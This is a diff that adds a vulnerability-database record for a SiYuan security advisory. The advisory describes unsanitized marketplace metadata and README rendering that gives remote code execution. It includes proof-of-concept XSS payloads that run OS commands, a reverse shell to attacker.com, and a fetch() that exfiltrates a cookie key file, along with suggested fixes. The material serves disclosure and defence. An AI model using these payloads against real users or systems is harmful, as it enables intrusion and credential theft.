@@ -1,0 +1,204 @@
+advisory_id: GHSA-v3mg-9v85-fcm7
+datasource_id: github_osv/GHSA-v3mg-9v85-fcm7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-v3mg-9v85-fcm7/GHSA-v3mg-9v85-fcm7.json
+aliases: []
+summary: |
+  SiYuan Vulnerable to Remote Code Execution via Malicious Bazaar Package — Marketplace XSS
+  # Remote Code Execution via Malicious Bazaar Package — Marketplace XSS
+
+  ## Summary
+
+  SiYuan's Bazaar (community marketplace) renders plugin/theme/template metadata and README content without sanitization. A malicious package author can achieve RCE on any user who browses the Bazaar by:
+
+  1. **Package metadata XSS (zero-click):** Package `displayName` and `description` fields are injected directly into HTML via template literals without escaping. Just loading the Bazaar page triggers execution.
+  2. **README XSS (one-click):** The `renderREADME` function uses `lute.New()` without `SetSanitize(true)`, so raw HTML in the README passes through to `innerHTML` unsanitized.
+
+  Both vectors execute in Electron's renderer with `nodeIntegration: true` and `contextIsolation: false`, giving full OS command execution.
+
+  ## Affected Component
+
+  - **Metadata rendering:** `app/src/config/bazaar.ts:275-277`
+  - **README rendering (backend):** `kernel/bazaar/package.go:635-645` (`renderREADME`)
+  - **README rendering (frontend):** `app/src/config/bazaar.ts:607` (`innerHTML`)
+  - **Electron config:** `app/electron/main.js:422-426` (`nodeIntegration: true`)
+  - **Version:** SiYuan <= 3.5.9
+
+  ## Vulnerable Code
+
+  ### Vector 1: Package metadata — no HTML escaping (bazaar.ts:275-277)
+
+  ```typescript
+  // Package name injected directly into HTML template — NO escaping
+  ${item.preferredName}${item.preferredName !== item.name
+      ? ` <span class="ft__on-surface ft__smaller">${item.name}</span>` : ""}
+
+  // Package description injected directly — NO escaping
+  <div class="b3-card__desc" title="${escapeAttr(item.preferredDesc) || ""}">
+      ${item.preferredDesc || ""}  <!-- UNESCAPED HTML -->
+  </div>
+  ```
+
+  Note: The `title` attribute uses `escapeAttr()`, but the actual text content does not — inconsistent escaping.
+
+  ### Vector 2: README rendering — no Lute sanitization (package.go:635-645)
+
+  ```go
+  func renderREADME(repoURL string, mdData []byte) (ret string, err error) {
+      luteEngine := lute.New()  // Fresh Lute instance — SetSanitize NOT called
+      luteEngine.SetSoftBreak2HardBreak(false)
+      luteEngine.SetCodeSyntaxHighlight(false)
+      linkBase := "https://cdn.jsdelivr.net/gh/" + ...
+      luteEngine.SetLinkBase(linkBase)
+      ret = luteEngine.Md2HTML(string(mdData))  // Raw HTML in markdown preserved
+      return
+  }
+  ```
+
+  Compare with the SiYuan note renderer in `kernel/util/lute.go:81`:
+  ```go
+  luteEngine.SetSanitize(true)  // Notes ARE sanitized — but README is NOT
+  ```
+
+  ### Frontend innerHTML injection (bazaar.ts:607)
+
+  ```typescript
+  fetchPost("/api/bazaar/getBazaarPackageREADME", {...}, response => {
+      mdElement.innerHTML = response.data.html;  // Unsanitized HTML from README
+  });
+  ```
+
+  ## Proof of Concept
+
+  ### Vector 1: Malicious package manifest (zero-click RCE)
+
+  A malicious `plugin.json` (or `theme.json`, `template.json`):
+
+  ```json
+  {
+      "name": "helpful-plugin",
+      "displayName": {
+          "default": "Helpful Plugin<img src=x onerror=\"require('child_process').exec('calc.exe')\">"
+      },
+      "description": {
+          "default": "A helpful plugin<img src=x onerror=\"require('child_process').exec('id>/tmp/pwned')\">"
+      },
+      "version": "1.0.0"
+  }
+  ```
+
+  When any user opens the Bazaar page and this package is in the listing, the `onerror` handler fires automatically (since `src=x` fails to load), executing arbitrary OS commands.
+
+  ### Vector 2: Malicious README.md (one-click RCE)
+
+  ```markdown
+  # Helpful Plugin
+
+  This plugin does helpful things.
+
+  <img src=x onerror="require('child_process').exec('calc.exe')">
+
+  ## Installation
+
+  Follow the usual steps.
+  ```
+
+  When a user clicks on the package to view its README, the raw HTML is rendered via `innerHTML` without sanitization, executing the `onerror` handler.
+
+  ### Reverse shell via README
+
+  ```markdown
+  # Cool Theme
+
+  <img src=x onerror="require('child_process').exec('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"')">
+  ```
+
+  ### Data exfiltration via package name
+
+  ```json
+  {
+      "displayName": {
+          "default": "<img src=x onerror=\"fetch('https://attacker.com/exfil?token='+require('fs').readFileSync(require('path').join(require('os').homedir(),'.config/siyuan/cookie.key'),'utf8'))\">"
+      }
+  }
+  ```
+
+  ## Attack Scenario
+
+  1. Attacker creates a GitHub repository with a plugin/theme/template
+  2. Attacker submits it to the SiYuan Bazaar (community marketplace)
+  3. Package manifest contains XSS payload in `displayName` or `description`
+  4. **Zero-click:** When ANY user browses the Bazaar, the package listing renders the malicious name/description → JavaScript executes → RCE
+  5. **One-click:** If the package README also contains raw HTML, clicking to view details triggers additional payloads
+
+  The attacker doesn't need to trick the user into installing anything. Simply browsing the marketplace is enough.
+
+  ## Impact
+
+  - **Severity:** CRITICAL (CVSS 9.6)
+  - **Type:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
+  - Full remote code execution via Electron's `nodeIntegration: true`
+  - Zero-click for metadata XSS — triggers on page load
+  - Supply-chain attack vector targeting all Bazaar users
+  - Can steal API tokens, session cookies, SSH keys, arbitrary files
+  - Can install persistence, backdoors, or ransomware
+  - Affects all SiYuan desktop users who browse the Bazaar
+
+  ## Suggested Fix
+
+  ### 1. Escape package metadata in template rendering (bazaar.ts)
+
+  ```typescript
+  // Use a proper HTML escape function
+  function escapeHtml(str: string): string {
+      return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  }
+
+  // Apply to all user-controlled metadata
+  ${escapeHtml(item.preferredName)}
+  <div class="b3-card__desc">${escapeHtml(item.preferredDesc || "")}</div>
+  ```
+
+  ### 2. Enable Lute sanitization for README rendering (package.go)
+
+  ```go
+  func renderREADME(repoURL string, mdData []byte) (ret string, err error) {
+      luteEngine := lute.New()
+      luteEngine.SetSanitize(true)  // ADD THIS
+      luteEngine.SetSoftBreak2HardBreak(false)
+      luteEngine.SetCodeSyntaxHighlight(false)
+      // ...
+  }
+  ```
+
+  ### 3. Long-term: Harden Electron configuration
+
+  ```javascript
+  webPreferences: {
+      nodeIntegration: false,
+      contextIsolation: true,
+      sandbox: true,
+  }
+  ```
+impacted_packages: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-v3mg-9v85-fcm7/GHSA-v3mg-9v85-fcm7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/siyuan-note/siyuan
+    reference_type:
+    reference_id:
+  - url: https://github.com/siyuan-note/siyuan/security/advisories/GHSA-v3mg-9v85-fcm7
+    reference_type:
+    reference_id:
+exploits: []
